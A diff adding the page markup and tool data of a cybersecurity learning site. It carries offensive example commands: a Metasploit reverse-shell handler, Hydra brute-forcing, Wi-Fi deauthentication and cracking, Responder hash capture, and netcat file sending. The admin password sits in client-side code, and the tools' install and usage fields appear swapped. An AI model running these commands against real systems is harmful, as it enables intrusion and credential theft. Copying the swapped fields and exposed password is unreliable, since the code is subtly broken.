+      Abuse Act (CFAA) and equivalent laws worldwide.<br/><br/>
+      By continuing you confirm you will use this knowledge responsibly and ethically.
+    </div>
+    <div class="pop-cd" id="popCd">Please read carefully - you may continue in <span id="cdNum">10</span>s</div>
+    <button class="pop-agree" id="popBtn" disabled onclick="closePop()">I UNDERSTAND AND AGREE</button>
+  </div>
+</div>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="#" class="nav-logo"><div class="logo-box">NW</div>NW CYBER<em>SAFEHUB</em></a>
+    <div class="nav-links" id="navLinks">
+      <button onclick="openPanel('tools')">Tools</button>
+      <button onclick="openPanel('news')">News</button>
+      <button onclick="openCVE()">CVE</button>
+      <button onclick="openPanel('prev')">Prevention</button>
+      <button onclick="openPanel('notes')">Theory</button>
+      <button class="btn-submit" onclick="openPanel('upload')">Submit</button>
+      <button class="btn-admin" onclick="openPanel('admin')">Admin</button>
+    </div>
+    <button class="hamburger" onclick="toggleNav()">&#9776;</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section id="hero">
+  <div class="orb orb1"></div>
+  <div class="orb orb2"></div>
+  <div class="orb orb3"></div>
+  <div class="hero-content">
+    <div class="hero-badge"><span class="bdot"></span>LIVE - 2026 - NW CYBERSAFEHUB</div>
+    <h1 class="hero-title">
+      <div class="l1">THE ULTIMATE</div>
+      <div class="l2">CYBER ARSENAL</div>
+    </h1>
+    <div class="type-line" id="typeLine"></div>
+    <p class="hero-sub">NW CyberSafeHub - your complete cybersecurity platform for tools, CVEs, threat intelligence, prevention guides, and deep theory. Built for bug bounty hunters, pentesters, and students.</p>
+    <div class="hero-btns">
+      <button class="btn-prim" onclick="openPanel('tools')">&#9889; Explore Tools</button>
+      <button class="btn-out" onclick="openCVE()">&#128269; Browse CVEs</button>
+    </div>
+    <div class="hero-stats">
+      <div><div class="stat-n">50+</div><div class="stat-l">Security Tools</div></div>
+      <div><div class="stat-n" id="cveStatNum">13+</div><div class="stat-l">2026 CVEs</div></div>
+      <div><div class="stat-n">30+</div><div class="stat-l">Attack Vectors</div></div>
+      <div><div class="stat-n">24/7</div><div class="stat-l">Updated</div></div>
+    </div>
+  </div>
+</section>
+
+<div class="div-line"></div>
+
+<!-- HOME SECTION CARDS -->
+<section style="padding:4rem 1.5rem;">
+  <div class="container">
+    <div class="sec-hdr">
+      <div class="sec-tag">Navigation</div>
+      <h2 class="sec-title">Explore The Platform</h2>
+      <p class="sec-sub">Click any section to dive deep into cybersecurity knowledge, tools, and intelligence.</p>
+    </div>
+    <div class="cards-grid">
+      <div class="c-card" onclick="openPanel('tools')">
+        <div class="c-icon" style="background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.2)">&#128296;</div>
+        <h3>Security Tools</h3>
+        <p>50+ curated tools organized by OS - Windows, Linux, macOS, Kali, Android. Full descriptions, install commands, usage examples for every tool.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+      <div class="c-card" onclick="openPanel('news')">
+        <div class="c-icon" style="background:rgba(255,45,120,.1);border:1px solid rgba(255,45,120,.2)">&#128225;</div>
+        <h3>Cyber Threat News</h3>
+        <p>Real-time 2026 cybersecurity news - ransomware attacks, zero-days, breach reports, APT activity with source links and threat ratings.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+      <div class="c-card" onclick="openCVE()">
+        <div class="c-icon" style="background:rgba(255,200,60,.1);border:1px solid rgba(255,200,60,.2)">&#128128;</div>
+        <h3>CVE Database 2026</h3>
+        <p>Searchable 2026 CVE database with full technical details, CVSS scores, exploitation techniques (educational), and patch information.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+      <div class="c-card" onclick="openPanel('prev')">
+        <div class="c-icon" style="background:rgba(127,255,0,.1);border:1px solid rgba(127,255,0,.2)">&#128737;</div>
+        <h3>Attack Prevention</h3>
+        <p>Defense guides per device type - mobile, PC, laptop, server, IoT, network. All major attack categories with step-by-step prevention.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+      <div class="c-card" onclick="openPanel('notes')">
+        <div class="c-icon" style="background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.2)">&#128218;</div>
+        <h3>CyberSec Theory</h3>
+        <p>Deep-dive study material covering networking, cryptography, malware analysis, pentesting methodology, web security, forensics and more.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+      <div class="c-card" onclick="openPanel('upload')">
+        <div class="c-icon" style="background:rgba(255,165,0,.1);border:1px solid rgba(255,165,0,.2)">&#128228;</div>
+        <h3>Community Submissions</h3>
+        <p>Submit your CVE discoveries, tools, news or notes. All reviewed by admins before publishing to maintain quality and accuracy.</p>
+        <span class="c-arrow">&#8599;</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PANEL: TOOLS -->
+<div class="overlay" id="ov-tools">
+  <div class="panel">
+    <button class="panel-x" onclick="closePanel('tools')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128296; Security Tools Arsenal</div>
+      <div class="panel-sub">Select your operating system to see available tools</div>
+    </div>
+    <div class="panel-body">
+      <div class="os-sel">
+        <button class="os-btn on" onclick="selOS('kali',this)"><span class="os-i">&#128009;</span>Kali Linux</button>
+        <button class="os-btn" onclick="selOS('linux',this)"><span class="os-i">&#128039;</span>Linux</button>
+        <button class="os-btn" onclick="selOS('windows',this)"><span class="os-i">&#129695;</span>Windows</button>
+        <button class="os-btn" onclick="selOS('mac',this)"><span class="os-i">&#127822;</span>macOS</button>
+        <button class="os-btn" onclick="selOS('android',this)"><span class="os-i">&#129302;</span>Android</button>
+        <button class="os-btn" onclick="selOS('all',this)"><span class="os-i">&#127760;</span>All</button>
+      </div>
+      <div class="tools-g" id="toolsG"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: NEWS -->
+<div class="overlay" id="ov-news">
+  <div class="panel">
+    <button class="panel-x" onclick="closePanel('news')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128225; Cybersecurity News 2026</div>
+      <div class="panel-sub">Latest threat intelligence, breach reports, and security advisories - 2026 only</div>
+    </div>
+    <div class="panel-body">
+      <div class="news-g" id="newsG"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: CVE -->
+<div class="overlay" id="ov-cve">
+  <div class="panel">
+    <button class="panel-x" onclick="closePanel('cve')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128128; CVE Database 2026</div>
+      <div class="panel-sub">2026 Common Vulnerabilities and Exposures - Educational Research Only</div>
+    </div>
+    <div class="panel-body">
+      <div class="edu-warn">
+        <span class="ew-icon">&#9888;&#65039;</span>
+        <div class="ew-txt"><strong>EDUCATIONAL PURPOSE ONLY:</strong> All CVE exploitation details are provided solely for security research, CTF challenges, and authorized penetration testing. Never use this information against systems you do not own.</div>
+      </div>
+      <div class="cve-search-row">
+        <input class="cve-inp" id="cveInp" type="text" placeholder="Search CVE ID, keyword, or product..." oninput="filterCVEs()"/>
+        <button class="cve-srch-btn" onclick="filterCVEs()">SEARCH</button>
+      </div>
+      <div class="cve-filters">
+        <button class="cve-fb on" onclick="setSevFilter('all',this)">ALL</button>
+        <button class="cve-fb" onclick="setSevFilter('CRITICAL',this)">CRITICAL</button>
+        <button class="cve-fb" onclick="setSevFilter('HIGH',this)">HIGH</button>
+        <button class="cve-fb" onclick="setSevFilter('MEDIUM',this)">MEDIUM</button>
+        <button class="cve-fb" onclick="setSevFilter('RCE',this)">RCE</button>
+        <button class="cve-fb" onclick="setSevFilter('SQLI',this)">SQL INJECTION</button>
+      </div>
+      <div class="cve-list" id="cveList"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: PREVENTION -->
+<div class="overlay" id="ov-prev">
+  <div class="panel">
+    <button class="panel-x" onclick="closePanel('prev')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128737; Attack Prevention Guide</div>
+      <div class="panel-sub">Choose your device type to see targeted protection strategies</div>
+    </div>
+    <div class="panel-body">
+      <div class="dev-sel">
+        <button class="dev-btn on" onclick="selDev('mobile',this)"><span class="dev-ic">&#128241;</span>Mobile</button>
+        <button class="dev-btn" onclick="selDev('computer',this)"><span class="dev-ic">&#128421;</span>Desktop</button>
+        <button class="dev-btn" onclick="selDev('laptop',this)"><span class="dev-ic">&#128187;</span>Laptop</button>
+        <button class="dev-btn" onclick="selDev('server',this)"><span class="dev-ic">&#128452;</span>Server</button>
+        <button class="dev-btn" onclick="selDev('iot',this)"><span class="dev-ic">&#128225;</span>IoT</button>
+        <button class="dev-btn" onclick="selDev('network',this)"><span class="dev-ic">&#127760;</span>Network</button>
+      </div>
+      <div class="prev-g" id="prevG"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: NOTES -->
+<div class="overlay" id="ov-notes">
+  <div class="panel" style="max-width:1200px;">
+    <button class="panel-x" onclick="closePanel('notes')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128218; CyberSec Theory and Study Notes</div>
+      <div class="panel-sub">Comprehensive study material from beginner to expert level</div>
+    </div>
+    <div class="panel-body">
+      <div class="notes-srch">
+        <input type="text" id="noteSrch" placeholder="Search topics, tools, techniques..." oninput="filterNotes()"/>
+        <button onclick="filterNotes()">&#128269;</button>
+      </div>
+      <div class="notes-layout">
+        <div class="notes-sb">
+          <h4>&#128193; Categories</h4>
+          <div id="noteCats"></div>
+        </div>
+        <div class="notes-grid" id="notesG"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: UPLOAD -->
+<div class="overlay" id="ov-upload">
+  <div class="panel">
+    <button class="panel-x" onclick="closePanel('upload')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128228; Community Submissions</div>
+      <div class="panel-sub">Submit your CVE, tools, news or notes - reviewed by admins before publishing</div>
+    </div>
+    <div class="panel-body">
+      <div class="upload-wrap">
+        <div class="step-dots" id="stepDots">
+          <div class="sdot2 on" id="d0"></div>
+          <div class="sdot2" id="d1"></div>
+          <div class="sdot2" id="d2"></div>
+        </div>
+        <div class="f-step on" id="fs0">
+          <h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:1rem;">What are you submitting?</h3>
+          <div class="section-pick">
+            <div class="sp-btn" onclick="chooseSection('tool')"><div class="sp-ic">&#128296;</div><div class="sp-nm">Security Tool</div><div class="sp-sub">Submit a new tool</div></div>
+            <div class="sp-btn" onclick="chooseSection('cve')"><div class="sp-ic">&#128128;</div><div class="sp-nm">CVE / Vulnerability</div><div class="sp-sub">Report a 2026 CVE</div></div>
+            <div class="sp-btn" onclick="chooseSection('news')"><div class="sp-ic">&#128225;</div><div class="sp-nm">Security News</div><div class="sp-sub">Share a threat report</div></div>
+            <div class="sp-btn" onclick="chooseSection('note')"><div class="sp-ic">&#128218;</div><div class="sp-nm">Study Notes</div><div class="sp-sub">Contribute education</div></div>
+          </div>
+        </div>
+        <div class="f-step" id="fs1">
+          <div id="fs1content"></div>
+          <div class="f-btns">
+            <button class="btn-back" onclick="goStep(0)">Back</button>
+            <button class="btn-next" onclick="goStep(2)">Continue</button>
+          </div>
+        </div>
+        <div class="f-step" id="fs2">
+          <h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:1rem;">Your Details</h3>
+          <div class="f-grp"><label>Full Name or Handle</label><input type="text" class="f-inp" id="pubName" placeholder="John Doe or @handle"/></div>
+          <div class="f-grp"><label>Email Address</label><input type="email" class="f-inp" id="pubEmail" placeholder="your@email.com"/></div>
+          <div class="f-grp"><label>Social or Website (optional)</label><input type="text" class="f-inp" id="pubSocial" placeholder="https://twitter.com/yourhandle"/></div>
+          <div class="f-grp"><label>Source or Reference URL</label><input type="url" class="f-inp" id="pubSource" placeholder="https://source.com/article"/></div>
+          <div class="f-grp"><label>Additional Notes</label><textarea class="f-ta" id="pubNotes" placeholder="Anything else for admins to know..."></textarea></div>
+          <div class="edu-warn" style="margin-top:1rem;">
+            <span class="ew-icon">&#9888;&#65039;</span>
+            <div class="ew-txt"><strong>Policy:</strong> All submissions are admin-reviewed. False or harmful content will be rejected. CVE details must be educational only.</div>
+          </div>
+          <div class="f-btns">
+            <button class="btn-back" onclick="goStep(1)">Back</button>
+            <button class="btn-next" onclick="submitForm()">Submit for Review</button>
+          </div>
+        </div>
+        <div class="f-step" id="fs3" style="text-align:center;padding:2rem 0;">
+          <div style="font-size:3.5rem;margin-bottom:1.2rem;">&#9989;</div>
+          <h3 style="font-family:var(--font-head);font-size:1.4rem;color:var(--green);margin-bottom:.8rem;">Submission Received!</h3>
+          <p style="color:var(--text2);line-height:1.7;margin-bottom:1.2rem;">Your submission is in the review queue. Admins will verify and publish it within 24-48 hours. You will be credited as the contributor.</p>
+          <button class="btn-next" onclick="resetForm()">Submit Another</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL: ADMIN -->
+<div class="overlay" id="ov-admin">
+  <div class="panel" style="max-width:1000px;">
+    <button class="panel-x" onclick="closePanel('admin')">&#10005;</button>
+    <div class="panel-hdr">
+      <div class="panel-ttl">&#128272; Admin Control Panel</div>
+      <div class="panel-sub">Manage submissions, publish updates, and control site content</div>
+    </div>
+    <div class="panel-body">
+      <div id="adminLogin">
+        <div style="max-width:360px;margin:0 auto;text-align:center;padding:1.5rem 0;">
+          <div style="font-size:2.8rem;margin-bottom:1.2rem;">&#128272;</div>
+          <h3 style="font-family:var(--font-head);font-size:1.2rem;color:var(--text);margin-bottom:1.2rem;">Admin Authentication</h3>
+          <div class="f-grp" style="text-align:left;">
+            <label>Admin Password</label>
+            <input type="password" class="f-inp" id="adminPass" placeholder="Enter admin password" onkeydown="if(event.key==='Enter')checkAdmin()"/>
+          </div>
+          <button class="btn-next" style="width:100%;margin-top:.4rem;" onclick="checkAdmin()">LOGIN</button>
+          <p style="font-size:.72rem;color:var(--text3);margin-top:.8rem;font-family:var(--font-mono);">Demo password: <span style="color:var(--accent)">admin2026</span></p>
+        </div>
+      </div>
+      <div id="adminDash" style="display:none;">
+        <div class="stat-row">
+          <div class="stat-box"><div class="stat-n2" id="pendCnt">3</div><div class="stat-l2">Pending</div></div>
+          <div class="stat-box"><div class="stat-n2" style="color:var(--green)">47</div><div class="stat-l2">Approved</div></div>
+          <div class="stat-box"><div class="stat-n2" style="color:var(--red)">5</div><div class="stat-l2">Rejected</div></div>
+          <div class="stat-box"><div class="stat-n2" style="color:var(--purple)">1.2K</div><div class="stat-l2">Visits</div></div>
+        </div>
+        <div class="admin-tabs">
+          <button class="atab on" onclick="swAdminTab('sub',this)">Pending Submissions</button>
+          <button class="atab" onclick="swAdminTab('upd',this)">Post Update</button>
+          <button class="atab" onclick="swAdminTab('addtool',this)">Add Tool</button>
+          <button class="atab" onclick="swAdminTab('addcve',this)">Add CVE</button>
+        </div>
+        <div class="atab-body on" id="atab-sub">
+          <div class="pend-list" id="pendList"></div>
+        </div>
+        <div class="atab-body" id="atab-upd">
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:1.3rem;">
+            <h4 style="font-family:var(--font-head);color:var(--text);margin-bottom:.8rem;">Post Site-Wide Update</h4>
+            <div class="f-grp"><label>Update Title</label><input type="text" class="f-inp" placeholder="e.g., New CVE batch added May 2026"/></div>
+            <div class="f-grp"><label>Content</label><textarea class="f-ta" style="min-height:160px;" placeholder="Write your announcement..."></textarea></div>
+            <div class="f-grp"><label>Target Section</label>
+              <select class="f-sel">
+                <option>All Sections</option><option>Tools</option><option>CVE Database</option>
+                <option>News</option><option>Prevention</option><option>Theory Notes</option>
+              </select>
+            </div>
+            <button class="btn-next" style="background:linear-gradient(135deg,var(--accent3),#5cb800);color:var(--bg);margin-top:.5rem;" onclick="alert('Update published successfully!')">PUBLISH UPDATE</button>
+          </div>
+        </div>
+        <div class="atab-body" id="atab-addtool">
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:1.3rem;">
+            <h4 style="font-family:var(--font-head);color:var(--text);margin-bottom:.8rem;">Add New Tool</h4>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:.8rem;">
+              <div class="f-grp"><label>Tool Name</label><input type="text" class="f-inp" placeholder="e.g., Nuclei"/></div>
+              <div class="f-grp"><label>Category</label><select class="f-sel"><option>Reconnaissance</option><option>Exploitation</option><option>Scanning</option><option>Web Security</option><option>Network</option><option>Password</option><option>Forensics</option></select></div>
+              <div class="f-grp"><label>Supported OS</label><input type="text" class="f-inp" placeholder="kali,linux,windows,mac"/></div>
+              <div class="f-grp"><label>License</label><select class="f-sel"><option>Free and Open Source</option><option>Free</option><option>Paid</option><option>Freemium</option></select></div>
+              <div class="f-grp" style="grid-column:1/-1;"><label>Install Command</label><input type="text" class="f-inp" placeholder="apt install toolname"/></div>
+              <div class="f-grp" style="grid-column:1/-1;"><label>Description</label><textarea class="f-ta" style="min-height:90px;" placeholder="Full tool description..."></textarea></div>
+            </div>
+            <button class="btn-next" style="margin-top:.5rem;" onclick="alert('Tool added to database!')">ADD TOOL</button>
+          </div>
+        </div>
+        <div class="atab-body" id="atab-addcve">
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:1.3rem;">
+            <h4 style="font-family:var(--font-head);color:var(--text);margin-bottom:.8rem;">Add New 2026 CVE</h4>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:.8rem;">
+              <div class="f-grp"><label>CVE ID</label><input type="text" class="f-inp" placeholder="CVE-2026-XXXXX"/></div>
+              <div class="f-grp"><label>CVSS Score</label><input type="number" class="f-inp" min="0" max="10" step="0.1" placeholder="9.8"/></div>
+              <div class="f-grp"><label>Severity</label><select class="f-sel"><option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option></select></div>
+              <div class="f-grp"><label>Affected Product</label><input type="text" class="f-inp" placeholder="e.g., Microsoft Word"/></div>
+              <div class="f-grp" style="grid-column:1/-1;"><label>Vulnerability Title</label><input type="text" class="f-inp" placeholder="Full vulnerability name..."/></div>
+              <div class="f-grp" style="grid-column:1/-1;"><label>Technical Description</label><textarea class="f-ta" style="min-height:90px;" placeholder="Full technical details..."></textarea></div>
+            </div>
+            <button class="btn-next" style="margin-top:.5rem;" onclick="alert('CVE added to 2026 database!')">ADD CVE</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="foot-inner">
+    <div class="foot-brand">
+      <div class="flogo">NW CYBERSAFEHUB</div>
+      <p>NW CyberSafeHub - the ultimate cybersecurity platform for bug bounty hunters, penetration testers, and security students. All for educational purposes.</p>
+    </div>
+    <div class="foot-col">
+      <h5>Sections</h5>
+      <ul>
+        <li><a href="#" onclick="openPanel('tools')">Security Tools</a></li>
+        <li><a href="#" onclick="openPanel('news')">Threat News</a></li>
+        <li><a href="#" onclick="openCVE()">CVE Database</a></li>
+        <li><a href="#" onclick="openPanel('prev')">Prevention Guide</a></li>
+        <li><a href="#" onclick="openPanel('notes')">Theory Notes</a></li>
+      </ul>
+    </div>
+    <div class="foot-col">
+      <h5>Resources</h5>
+      <ul>
+        <li><a href="https://nvd.nist.gov" target="_blank">NIST NVD</a></li>
+        <li><a href="https://cve.org" target="_blank">CVE.org</a></li>
+        <li><a href="https://www.exploit-db.com" target="_blank">Exploit-DB</a></li>
+        <li><a href="https://www.hackerone.com" target="_blank">HackerOne</a></li>
+        <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger</a></li>
+      </ul>
+    </div>
+    <div class="foot-col">
+      <h5>Legal</h5>
+      <ul>
+        <li><a href="#">Educational Use Only</a></li>
+        <li><a href="#">Responsible Disclosure</a></li>
+        <li><a href="#">Privacy Policy</a></li>
+        <li><a href="#">Terms of Service</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot-bot">WARNING: All content is for educational and research purposes only. Unauthorized exploitation of security vulnerabilities is illegal. Copyright 2026 NW CyberSafeHub</div>
+</footer>
+
+<script>
+var TOOLS={kali:[{name:"Nmap",icon:"&#128301;",cat:"recon",catL:"Reconnaissance",tags:["free","opensource","kali","linux"],desc:"World-famous network scanner. Discovers hosts, open ports, services, OS versions. Foundation of every pentest and bug bounty recon phase. Supports 600+ NSE scripts.",install:"nmap -sV -sC -p- target.com\nnmap -A -T4 target.com\nnmap --script vuln target.com",usage:"sudo apt install nmap",detail:"Supports SYN scan, UDP scan, OS detection, version detection. NSE scripts add vulnerability detection capability."},{name:"Metasploit",icon:"&#128163;",cat:"exploit",catL:"Exploitation",tags:["free","opensource","kali"],desc:"The world's most used penetration testing framework. 2200+ exploits and 3500+ modules for exploitation, post-exploitation, payload generation, and pivoting.",install:"msfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST YOUR_IP\nexploit",usage:"msfconsole",detail:"Contains staged and stageless payloads, custom encoders, and persistent backdoor modules. Integrates with Nmap and Nessus."},{name:"Burp Suite",icon:"&#128375;",cat:"web",catL:"Web Security",tags:["free","paid","kali","windows","mac"],desc:"The de-facto standard for web application security testing. Intercept HTTP/S traffic, active and passive scanning, fuzzing, intruder attacks. Essential for bug bounty.",install:"# Community Edition:\nburpsuite\n# Setup proxy in browser: 127.0.0.1:8080\n# Import CA certificate for HTTPS",usage:"java -jar burpsuite_community.jar",detail:"Features Scanner, Repeater, Intruder, Collaborator, Decoder. Extensible via BApp Store with 200+ extensions."},{name:"SQLMap",icon:"&#128137;",cat:"web",catL:"Web Security",tags:["free","opensource","kali","linux","windows"],desc:"Automated SQL injection and database takeover tool. Detects and exploits SQL injection flaws. Supports MySQL, Oracle, PostgreSQL, MSSQL, SQLite and more.",install:"sqlmap -u 'http://target.com/?id=1' --dbs\nsqlmap -u 'http://target.com/?id=1' -D dbname --tables\nsqlmap -u 'http://target.com/?id=1' --dump",usage:"sudo apt install sqlmap",detail:"Supports 6 injection techniques: Boolean blind, Error-based, UNION query, Stacked queries, Time-based blind, Inline queries."},{name:"Wireshark",icon:"&#128225;",cat:"network",catL:"Network Analysis",tags:["free","opensource","kali","linux","windows","mac"],desc:"World's most popular network protocol analyzer. Capture and analyze traffic from live networks or pcap files. Supports 3000+ protocols with deep inspection.",install:"wireshark\ntshark -i eth0 -w capture.pcap\ntshark -r capture.pcap -Y 'http' -T fields -e http.host",usage:"sudo apt install wireshark",detail:"Supports live capture and offline analysis, display filters, decryption for many protocols with proper keys."},{name:"Hydra",icon:"&#128013;",cat:"password",catL:"Brute Force",tags:["free","opensource","kali","linux"],desc:"Fast and flexible online password cracking. Supports 50+ protocols: FTP, HTTP, SSH, SMB, SMTP, RDP, MySQL, VNC and many more. Essential for authorized credential testing.",install:"hydra -l admin -P rockyou.txt ssh://target.com\nhydra -L users.txt -P pass.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\nhydra -l root -P wordlist.txt ftp://192.168.1.1",usage:"sudo apt install hydra",detail:"Use -t flag to control parallelism. Always obtain written authorization before brute-forcing any system."},{name:"Aircrack-ng",icon:"&#128247;",cat:"network",catL:"Wireless Security",tags:["free","opensource","kali"],desc:"Complete WiFi security assessment suite. WEP, WPA/WPA2 cracking, packet injection, AP detection, deauthentication attacks. Essential for wireless penetration testing.",install:"airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon\naircrack-ng -b BSSID -w rockyou.txt capture.cap",usage:"sudo apt install aircrack-ng",detail:"Suite includes airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, airdecap-ng and more. Use on authorized networks only."},{name:"Nikto",icon:"&#128373;",cat:"scan",catL:"Web Scanner",tags:["free","opensource","kali","linux"],desc:"Open source web server scanner. Tests for 6700+ dangerous files and CGIs, outdated software, and server configuration issues. Fast non-stealthy scanner for initial assessment.",install:"nikto -h http://target.com\nnikto -h target.com -ssl -port 443\nnikto -h target.com -Format html -output report.html",usage:"sudo apt install nikto",detail:"Tuning options allow targeting specific vulnerability classes. Not stealthy - use only on authorized targets."},{name:"John the Ripper",icon:"&#128273;",cat:"password",catL:"Hash Cracking",tags:["free","opensource","kali","linux","windows"],desc:"Fast password cracker with auto-detection of hash types. Supports dictionary, brute-force, and hybrid attacks across hundreds of hash formats including MD5, SHA, bcrypt, NTLM.",install:"john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --format=NT --wordlist=wordlist.txt hashes.txt\njohn --show hashes.txt",usage:"sudo apt install john",detail:"Jumbo version supports 100+ hash types. Works with password files from Unix/Linux, Windows, databases, web apps."},{name:"Hashcat",icon:"&#128272;",cat:"password",catL:"GPU Hash Cracker",tags:["free","opensource","kali","linux","windows"],desc:"World's fastest GPU-based password recovery. Supports 350+ hash types and 5 attack modes. GPU acceleration via CUDA/OpenCL enables billions of hashes per second.",install:"hashcat -m 0 -a 0 hashes.txt rockyou.txt\nhashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a\nhashcat -m 22000 wifi.hc22000 rockyou.txt",usage:"sudo apt install hashcat",detail:"Attack modes: Dictionary, Combinator, Brute-force, Rule-based, Toggle-case. GPU acceleration is transformatively faster than CPU."},{name:"Gobuster",icon:"&#128682;",cat:"recon",catL:"Directory Bruteforce",tags:["free","opensource","kali","linux"],desc:"Fast directory and subdomain bruter written in Go. Discovers hidden directories, subdomains, virtual hosts. The modern replacement for DirBuster - much faster.",install:"gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\ngobuster dns -d target.com -w subdomains.txt\ngobuster vhost -u http://target.com -w vhosts.txt",usage:"sudo apt install gobuster",detail:"Supports dir, dns, s3, gcs, fuzz, and vhost modes. Much faster than legacy Java-based tools."},{name:"Nuclei",icon:"&#9762;",cat:"scan",catL:"Vuln Scanner",tags:["free","opensource","kali","linux","windows","mac"],desc:"Fast template-based vulnerability scanner. 8000+ community templates covering CVEs, misconfigs, exposed panels, default creds. Updated daily. Used by top bug bounty hunters.",install:"nuclei -u https://target.com\nnuclei -l targets.txt -t cves/ -severity critical,high\nnuclei -u target.com -t exposures/ -t misconfiguration/",usage:"go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",detail:"Templates are YAML files covering thousands of vulnerability patterns. Easy to write custom templates for specific bugs."},{name:"Amass",icon:"&#127760;",cat:"recon",catL:"Subdomain Enum",tags:["free","opensource","kali","linux","windows","mac"],desc:"OWASP-backed in-depth DNS enumeration tool. Uses 50+ data sources including Shodan, Censys, VirusTotal, certificate transparency. Gold standard for subdomain recon.",install:"amass enum -d target.com\namass enum -passive -d target.com -o subdomains.txt\namass enum -brute -d target.com -w wordlist.txt",usage:"sudo apt install amass",detail:"Integrates 50+ data sources. Builds a comprehensive map of the target's attack surface."},{name:"Volatility 3",icon:"&#129504;",cat:"forensics",catL:"Memory Forensics",tags:["free","opensource","kali","linux","windows"],desc:"Advanced memory forensics framework. Extract artifacts from RAM dumps: running processes, network connections, credentials, malware indicators, and injected code.",install:"vol3 -f memory.raw windows.pslist\nvol3 -f memory.raw windows.netscan\nvol3 -f memory.raw windows.malfind",usage:"pip install volatility3",detail:"Supports Windows, Linux, macOS memory images. Plugins detect rootkits, code injection, and process hiding."},{name:"BloodHound",icon:"&#128021;",cat:"recon",catL:"AD Attack Paths",tags:["free","opensource","kali"],desc:"Active Directory attack path visualization using graph theory. Reveals shortest path from any user to Domain Admin. Detects Kerberoasting, ACL abuse, delegation misconfigs.",install:"# Collect data:\nSharpHound.exe -c All --zipfilename output.zip\n# OR Linux:\nbloodhound-python -d domain.com -u user -p pass -ns dc_ip -c all\n# Start UI:\nbloodhound",usage:"sudo apt install bloodhound",detail:"Visualizes thousands of AD relationships. 'Shortest Path to DA' query finds PE chains no manual review would catch."},{name:"Responder",icon:"&#128226;",cat:"network",catL:"LLMNR Poisoner",tags:["free","opensource","kali","linux"],desc:"LLMNR, NBT-NS, and mDNS poisoner with rogue authentication servers for SMB, HTTP, HTTPS, FTP, LDAP. Captures NTLMv2 hashes from Windows machines on the same network.",install:"responder -I eth0 -rdw\n# View captured hashes:\ncat /usr/share/responder/logs/SMB-NTLMv2-*.txt\n# Crack with hashcat:\nhashcat -m 5600 NTLMv2.txt rockyou.txt",usage:"sudo apt install responder",detail:"Extremely effective on enterprise networks. Any Windows host doing LLMNR lookup for a non-existent host is vulnerable."}],linux:[{name:"Nmap",icon:"&#128301;",cat:"recon",catL:"Reconnaissance",tags:["free","opensource","linux"],desc:"Network exploration and security auditing tool. Discover hosts, scan open ports, detect OS and services. Available on all Linux distros. Supports 600+ NSE scripts.",install:"nmap -sV -A -p- target.com\nsudo nmap -sS -O target.com\nnmap --script vuln target.com",usage:"sudo apt install nmap",detail:"SYN scan requires root. NSE scripts enable vulnerability detection, brute-force, and protocol enumeration."},{name:"Netcat",icon:"&#128279;",cat:"network",catL:"Network Swiss Knife",tags:["free","opensource","linux","mac","windows"],desc:"The Swiss Army Knife of networking. Read and write data across TCP/UDP connections. Used for port scanning, banner grabbing, file transfers, and reverse shells.",install:"nc -v target.com 22\nnc -zv target.com 1-1000\nnc -lvp 4444\nnc target.com 1234 < file.txt",usage:"sudo apt install netcat-traditional",detail:"Ncat (from Nmap project) is the modern enhanced version. Socat is a more powerful alternative for advanced use."},{name:"TCPDump",icon:"&#128246;",cat:"network",catL:"Packet Capture",tags:["free","opensource","linux","mac"],desc:"Powerful command-line packet analyzer. Capture and analyze network traffic. Lightweight and scriptable - essential for incident response on headless servers.",install:"tcpdump -i eth0 -w capture.pcap\ntcpdump -i eth0 port 80 -A\ntcpdump -r capture.pcap\ntcpdump -i eth0 -A -s0 port ftp",usage:"sudo apt install tcpdump",detail:"BPF syntax provides powerful filtering. Backend for Wireshark. Works on all Unix-like 